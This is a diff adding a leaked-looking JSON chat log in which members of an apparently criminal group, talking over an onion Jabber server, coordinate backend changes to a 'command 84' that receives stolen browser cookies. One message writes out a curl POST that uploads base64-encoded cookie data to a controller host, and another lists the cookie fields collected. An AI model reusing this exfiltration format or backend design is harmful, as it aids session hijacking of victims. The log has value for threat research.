+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "так а по-моему driver говорил что накатил миграции на базу. Это не оно?\nцитату не приведу, уплыло в истории"
+    },
+    "2021-09-02T12:03:26.089525": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "driver: поясни мне чего ты ждешь?"
+    },
+    "2021-09-02T12:03:26.092631": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "driver: поясни мне чего ты ждешь?"
+    },
+    "2021-09-02T12:03:33.358788": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "что нужно от зуласа?"
+    },
+    "2021-09-02T12:03:33.364153": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "что нужно от зуласа?"
+    },
+    "2021-09-02T12:11:37.699658": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Дело в том что миграция по десктопу относится к другой задаче."
+    },
+    "2021-09-02T12:11:51.014577": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Сейчас нужно сделать 2 этих поля"
+    },
+    "2021-09-02T12:12:18.866061": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "zulas: сделаешь?"
+    },
+    "2021-09-02T12:12:18.869679": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: сделаешь?"
+    },
+    "2021-09-02T12:14:06.096417": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Более того к другой команде и к другой таблице."
+    },
+    "2021-09-02T12:15:43.896786": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@driver давай конкретно что тебе надо и куда ... ок ?"
+    },
+    "2021-09-02T12:17:36.622635": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Нужно в 84 команду внести 2 поля.\nsecure, httponly в конец приема, получается 9 и 10 поле должно быть."
+    },
+    "2021-09-02T12:18:22.061675": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "На запрос вида \ncurl -X POST -F 'data=dXNlcg==|IE||||1240428288|1240428288|dXNlcg==|IE|demdex.net|ZGVtZGV4|NTczODQzMjMyMTAwNDg1MDEyMDI3NjIxMTIxODA0ODI1OTMyMjQ=|1240428358|1240428358|Lw==|1|1' http://(IP)/TAG/TEST_W639600.1234A242341C6D1A25B3F315D688968E/84/\nДолжно ответить /1/"
+    },
+    "2021-09-02T12:20:09.145575": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок .. сейчас в базе поля уже есть ?"
+    },
+    "2021-09-02T12:20:19.949749": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Да"
+    },
+    "2021-09-02T12:28:19.570896": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а старые клиенты еще работают ?"
+    },
+    "2021-09-02T12:28:40.296832": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "т.е. надо поддерживать и старый формат и новый ?"
+    },
+    "2021-09-02T12:29:44.532344": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Нет, просто только новый должен начать работать."
+    },
+    "2021-09-02T12:30:37.242447": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Уже внесли нужные изменения для клиентов. Ждем именно чтобы подхватило эти изменения часть по бэку"
+    },
+    "2021-09-02T12:59:04.944086": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: очень прошу поторопиться, так как сейчас от тебя зависит работа многих, без правок бекенда не можем дальше двинуться"
+    },
+    "2021-09-02T13:03:56.540055": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "хорошо сделаю"
+    },
+    "2021-09-02T13:23:09.878163": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]"
+    },
+    "2021-09-02T13:23:13.462035": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "такая последовательность ?"
+    },
+    "2021-09-02T13:23:20.883767": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@driver"
+    },
+    "2021-09-02T13:26:58.912089": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@defender как мне запушить изменения ?"
+    },
+    "2021-09-02T13:37:09.262183": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "Да все верно."
+    },
+    "2021-09-02T14:18:44.636605": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "zulas: а я тебе вроде выдавал доступ, разве нет?"
+    },
+    "2021-09-06T10:10:21.977774": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сегодня отдых у всех ?"
+    },
+    "2021-09-13T12:50:12.637875": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сегодня отдых у всех ?"
+    },
+    "2021-09-13T12:50:18.677351": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "есть кто"
+    },
+    "2021-09-13T12:50:18.678550": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "есть кто"
+    },
+    "2021-09-14T10:06:28.575970": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сегодня отдых у всех ?"
+    },
+    "2021-09-14T10:06:28.576902": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "есть кто"
+    }
+}
